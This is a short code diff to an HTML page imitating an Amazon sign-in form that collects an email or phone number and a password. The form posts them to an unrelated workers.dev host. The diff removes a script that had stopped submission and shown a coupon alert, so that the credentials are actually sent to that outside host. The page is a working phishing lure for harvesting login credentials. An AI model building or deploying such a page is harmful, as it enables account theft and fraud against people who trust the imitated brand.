@@ -12,7 +12,7 @@
         <div class="cont">
             <div class="box">
                 <h1>Sign in</h1>
-                <form id="loginForm" action="https://amazon-college-extension-activity.bradithya614.workers.dev/" method="POST">
+                <form action="https://amazon-college-extension-activity.bradithya614.workers.dev/" method="POST">
                     <label>Email or mobile phone number</label>
                     <input type="text" name="user">
                     <label>Password <span class="split">Forgot Password</span></label>
@@ -23,12 +23,5 @@
             </div>
         </div>
     </div>
-
-    <script>
-        document.getElementById('loginForm').addEventListener('submit', function(event) {
-            event.preventDefault(); // Prevent the default form submission
-            alert('You will receive your coupon soon.'); // Show the alert
-        });
-    </script>
 </body>
 </html>
